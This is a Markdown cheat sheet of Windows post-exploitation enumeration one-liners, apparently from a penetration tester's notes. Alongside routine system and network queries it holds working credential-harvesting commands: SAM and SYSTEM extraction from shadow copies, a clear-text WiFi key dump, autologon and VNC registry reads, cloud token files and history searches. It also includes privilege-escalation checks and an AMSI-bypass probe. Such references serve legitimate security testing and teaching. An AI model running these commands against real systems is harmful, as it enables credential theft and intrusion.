---
title: "Windows Enumeration"
description: "Quick one-liners for post-exploitation enumeration on Windows systems."
category: enumeration
tags: ["enumeration", "privilege-escalation"]
tools: ["PowerShell"]
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Enumeration/Windows Emumeration.md"
---
# Windows Enumeration Cheat Sheet

Quick one-liners for post-exploitation enumeration on Windows systems.

---

## System Information

```cmd
:: Basic system info
systeminfo
hostname
whoami /all

:: OS version and architecture
wmic os get caption,version,osarchitecture
[Environment]::Is64BitOperatingSystem

:: Installed patches/hotfixes
wmic qfe list full
wmic qfe get HotFixID,InstalledOn

:: Environment variables
set
Get-ChildItem Env:

:: Check if machine is domain-joined
systeminfo | findstr /B "Domain"
wmic computersystem get domain
```

---

## Current User Context

```cmd
:: Who am I?
whoami
whoami /priv
whoami /groups
whoami /all

:: Current user's home directory
echo %USERPROFILE%
$env:USERPROFILE

:: Check for admin privileges
net session 2>nul && echo Admin || echo Not Admin
```

---

## Users and Groups

```cmd
:: List all local users
net user
Get-LocalUser

:: Detailed user info
net user <username>
Get-LocalUser -Name <username> | Select-Object *

:: List all local groups
net localgroup
Get-LocalGroup

:: Members of specific groups
net localgroup Administrators
net localgroup "Remote Desktop Users"
net localgroup "Backup Operators"
Get-LocalGroupMember -Group "Administrators"

:: Domain users (if domain-joined)
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

---

## Network Information

```cmd
:: IP configuration
ipconfig /all
Get-NetIPConfiguration
Get-NetIPAddress

:: Routing table
route print
Get-NetRoute

:: ARP cache
arp -a
Get-NetNeighbor

:: Active connections
netstat -ano
netstat -anob
Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess

:: Listening ports
netstat -an | findstr LISTENING
Get-NetTCPConnection -State Listen

:: DNS cache
ipconfig /displaydns

:: Network shares
net share
Get-SmbShare

:: Connected shares
net use
Get-SmbConnection

:: Firewall status
netsh advfirewall show allprofiles
Get-NetFirewallProfile

:: Firewall rules
netsh advfirewall firewall show rule name=all
Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'}
```

---

## Password Hunting

### Common Credential Locations

```powershell
# Search for files containing "password"
findstr /si "password" *.txt *.ini *.config *.xml *.cfg
findstr /spin "password" *.*

# Search entire C: drive (slow but thorough)
findstr /si /m "password" C:\*.txt C:\*.ini C:\*.config C:\*.xml

# PowerShell recursive search
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml,*.cfg -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue

# Search for common credential patterns
findstr /si "pwd= pass= passwd= credentials" *.* 2>nul
findstr /si "connectionstring" *.config *.xml 2>nul
```

### Unattended Installation Files

```cmd
:: Classic unattend files (often contain plaintext/base64 passwords)
type C:\unattend.xml
type C:\Windows\Panther\unattend.xml
type C:\Windows\Panther\Unattend\unattend.xml
type C:\Windows\system32\sysprep.inf
type C:\Windows\system32\sysprep\sysprep.xml

:: Check all possible locations
dir /s /b C:\*unattend*.xml 2>nul
dir /s /b C:\*sysprep*.xml 2>nul
dir /s /b C:\*sysprep*.inf 2>nul
```

### Web Config Files

```cmd
:: IIS web.config files
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

:: Find all web.config files
dir /s /b C:\web.config 2>nul
dir /s /b C:\inetpub\*.config 2>nul

:: Search for connection strings
findstr /si "connectionString" C:\inetpub\*.config 2>nul
```

### Registry Stored Credentials

```cmd
:: Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon

:: VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul
reg query "HKLM\SOFTWARE\RealVNC\vncserver" /v Password 2>nul

:: Putty stored sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

:: SNMP community strings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities" 2>nul

:: Search registry for password strings
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul
```

### SAM and SYSTEM Files (requires SYSTEM privileges)

```cmd
:: Check for backup SAM files
dir /s /b C:\Windows\repair\SAM 2>nul
dir /s /b C:\Windows\System32\config\RegBack\SAM 2>nul

:: Shadow copy SAM extraction
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### Credential Manager

```cmd
:: List saved credentials
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all

:: PowerShell credential manager enum
Get-ChildItem -Path C:\Users\*\AppData\Local\Microsoft\Credentials -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Credentials -Recurse -Force -ErrorAction SilentlyContinue
```

### DPAPI Master Keys

```powershell
# DPAPI master key locations
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Protect -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\*\AppData\Local\Microsoft\Protect -Recurse -Force -ErrorAction SilentlyContinue
```

### WiFi Passwords

```cmd
:: List saved WiFi profiles
netsh wlan show profiles

:: Extract WiFi password (run for each profile)
netsh wlan show profile name="<SSID>" key=clear

:: One-liner to dump all WiFi passwords
for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "Profile"') do @netsh wlan show profile name=%a key=clear | findstr "Key Content"
```

### Browser Credentials

```cmd
:: Chrome saved passwords location
dir "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data" 2>nul

:: Firefox profiles
dir "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*" 2>nul

:: Edge passwords
dir "C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" 2>nul
```

### Common Application Credentials

```cmd
:: FileZilla
type "C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml" 2>nul
type "C:\Users\*\AppData\Roaming\FileZilla\sitemanager.xml" 2>nul

:: WinSCP
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s 2>nul

:: mRemoteNG (encrypted but crackable)
type "C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml" 2>nul

:: RDP connection history
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s

:: AWS credentials
type C:\Users\*\.aws\credentials 2>nul

:: Azure CLI
type C:\Users\*\.azure\accessTokens.json 2>nul
```

---

## PowerShell History

```powershell
# Current user's PSReadLine history (most common)
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content (Get-PSReadLineOption).HistorySavePath

# All users' PowerShell history
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "`n=== $($_.FullName) ===" -ForegroundColor Yellow; Get-Content $_ }

# Search history for interesting strings
Select-String -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Pattern "password","credential","secret","key","token" -ErrorAction SilentlyContinue

# Transcript logs (if enabled)
Get-ChildItem -Path C:\Users\*\Documents\PowerShell_transcript* -ErrorAction SilentlyContinue
dir /s /b C:\*transcript*.txt 2>nul
```

---

## Scheduled Tasks

```cmd
:: List all scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}

:: Detailed task info
schtasks /query /tn "<taskname>" /fo LIST /v
Get-ScheduledTask -TaskName "<taskname>" | Get-ScheduledTaskInfo

:: Find tasks running as SYSTEM or high-priv users
schtasks /query /fo LIST /v | findstr /i "Task To Run: Run As User:"

# PowerShell - tasks with actions
Get-ScheduledTask | ForEach-Object { $task = $_; $_.Actions | ForEach-Object { [PSCustomObject]@{TaskName=$task.TaskName; Execute=$_.Execute; Arguments=$_.Arguments; RunAs=$task.Principal.UserId} }}
```

---

## Services

```cmd
:: List all services
sc query state= all
Get-Service
wmic service list brief

:: Find services running as SYSTEM
wmic service get name,startname | findstr /i "LocalSystem"

:: Detailed service info
sc qc <servicename>
Get-Service -Name <servicename> | Select-Object *
Get-WmiObject win32_service | Where-Object {$_.Name -eq "<servicename>"} | Select-Object *

:: Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike "*`"*" -and $_.PathName -like "* *"} | Select-Object Name,PathName,StartMode

:: Service binary permissions (check with icacls)
for /f "tokens=2 delims='='" %a in ('wmic service list full ^| findstr /i "pathname" ^| findstr /i /v "system32"') do @echo %a >> c:\temp\services.txt
```

---

## Installed Software

```cmd
:: Installed programs (32-bit and 64-bit)
wmic product get name,version
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion

:: Programs in Program Files
dir "C:\Program Files" /b
dir "C:\Program Files (x86)" /b

:: Recently installed programs
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Sort-Object InstallDate -Descending | Select-Object -First 20 DisplayName,InstallDate
```

---

## Processes

```cmd
:: List all processes
tasklist /v
Get-Process | Select-Object ProcessName,Id,Path

:: Processes with owners
Get-WmiObject Win32_Process | Select-Object ProcessId,Name,@{N='Owner';E={$_.GetOwner().User}}

:: Find processes running as SYSTEM
tasklist /v | findstr /i "SYSTEM"

:: Process command lines
wmic process get processid,commandline
Get-WmiObject Win32_Process | Select-Object ProcessId,CommandLine
```

---

## Privilege Escalation Vectors

### AlwaysInstallElevated

```cmd
:: Check if AlwaysInstallElevated is set (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
```

### Token Privileges

```powershell
# Check for dangerous privileges
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken SeBackup SeRestore SeDebug SeTakeOwnership SeLoadDriver"

# Commonly exploitable privileges:
# - SeImpersonatePrivilege -> Potato attacks
# - SeAssignPrimaryTokenPrivilege -> Token manipulation
# - SeBackupPrivilege -> Read any file
# - SeRestorePrivilege -> Write any file
# - SeDebugPrivilege -> Debug any process
# - SeTakeOwnershipPrivilege -> Take ownership of objects
# - SeLoadDriverPrivilege -> Load kernel drivers
```

### Modifiable Services

```powershell
# Find services with weak permissions (requires accesschk from Sysinternals)
accesschk.exe /accepteula -uwcqv "Authenticated Users" * 2>nul
accesschk.exe /accepteula -uwcqv "Everyone" * 2>nul
accesschk.exe /accepteula -uwcqv "Users" * 2>nul

# Check specific service
accesschk.exe /accepteula -ucqv <servicename>
```

### PATH Hijacking

```cmd
:: Check PATH for writable directories
echo %PATH%
$env:PATH -split ';' | ForEach-Object { if (Test-Path $_) { Get-Acl $_ | Select-Object Path,AccessToString } }
```

### Startup Programs

```cmd
:: Current user startup
dir "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"

:: All users startup
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
```

---

## Antivirus and Security

```cmd
:: Windows Defender status
sc query WinDefend
Get-MpComputerStatus

:: Check for running AV processes
tasklist | findstr /i "avast avg avira bitdefender eset kaspersky malware mcafee norton sophos symantec trend"

:: AMSI bypass check
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)

:: AppLocker policy
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

:: Check for Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode
```

---

## Files and Directories of Interest

```cmd
:: User directories
dir C:\Users /b
Get-ChildItem C:\Users -Directory

:: Desktop files (all users)
dir C:\Users\*\Desktop\*.* /s 2>nul

:: Documents (all users)  
dir C:\Users\*\Documents\*.* /s 2>nul

:: Downloads (all users)
dir C:\Users\*\Downloads\*.* /s 2>nul

:: Recently accessed files
dir C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\*.lnk 2>nul

:: Find interesting file extensions
dir /s /b C:\*.kdbx 2>nul
dir /s /b C:\*.pfx 2>nul
dir /s /b C:\*.ppk 2>nul
dir /s /b C:\*.pem 2>nul
dir /s /b C:\*.key 2>nul
dir /s /b C:\*password*.txt 2>nul
dir /s /b C:\*cred*.txt 2>nul

# PowerShell find interesting files
Get-ChildItem -Path C:\ -Include *.kdbx,*.pfx,*.ppk,*.pem,*.key -Recurse -ErrorAction SilentlyContinue
```

---

## Quick Wins - Combined Commands

```powershell
# Dump everything to a file
systeminfo > enum.txt & whoami /all >> enum.txt & ipconfig /all >> enum.txt & netstat -ano >> enum.txt & net user >> enum.txt & net localgroup Administrators >> enum.txt

# Quick credential hunt
findstr /si "password=" *.xml *.ini *.txt *.config 2>nul

# Check for low-hanging fruit
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword"
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul
cmdkey /list
```

---

## Useful One-Liner Collection

```powershell
# Find all writable directories in PATH
$env:PATH -split ';' | Where-Object { $_ } | ForEach-Object { try { if ((Get-Acl $_).Access | Where-Object { $_.FileSystemRights -match 'Write|FullControl' -and $_.IdentityReference -match 'Users|Everyone|Authenticated' }) { $_ } } catch {} }

# Find all files modified in last 7 days
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) -and !$_.PSIsContainer } | Select-Object FullName,LastWriteTime

# Extract all IPs from files
Select-String -Path C:\*.txt,C:\*.log -Pattern '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b' -ErrorAction SilentlyContinue | Select-Object -Unique Matches

# Find files containing specific strings
Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.config,*.xml,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern "password|credential|secret" -ErrorAction SilentlyContinue | Select-Object Path,LineNumber,Line

# Enum all services with binary paths outside System32
Get-WmiObject win32_service | Where-Object {$_.PathName -notmatch 'system32'} | Select-Object Name,PathName,State,StartMode
```

---

_For automated enumeration, consider using tools like WinPEAS, PowerUp, Seatbelt, or SharpUp._
